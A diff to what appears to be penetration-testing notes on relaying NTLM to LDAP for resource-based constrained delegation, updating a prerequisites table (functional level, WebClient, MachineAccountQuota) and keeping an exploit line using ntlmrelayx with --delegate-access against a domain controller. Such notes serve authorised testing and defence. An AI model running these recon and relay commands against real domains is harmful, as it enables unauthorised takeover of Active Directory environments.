@@ -206,9 +206,12 @@ Relay NTLM to LDAP to write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a targ
 |-------|----------|--------|
 | LDAP signing not enforced | ✅ | `nxc ldap --module ldap-checker` |
 | LDAP channel binding not required | ✅ | `nxc ldap --module ldap-checker` |
+| Domain functional level ≥ 2012 R2 | ✅ | ldap3 `msDS-Behavior-Version` |
 | Writable computer object exists | ✅ | `bloodyAD get writable --otype COMPUTER` |
-| MachineAccountQuota > 0 | ⚠️ Optional | `nxc ldap --module maq` / ldap3 |
-| Domain functional level ≥ 2008 | ⚠️ Optional | ldap3 `msDS-Behavior-Version` |
+| MachineAccountQuota > 0 | ⚠️ Optional¹ | `nxc ldap --module maq` / ldap3 |
+| WebClient running on target | ⚠️ Optional | `nxc smb --module webdav` |
+
+¹ MAQ = 0 is a soft blocker — RBCD remains viable if you already control an existing machine account in the domain.
 
 **Exploit:** `ntlmrelayx.py -t ldaps://<dc> --delegate-access`
 
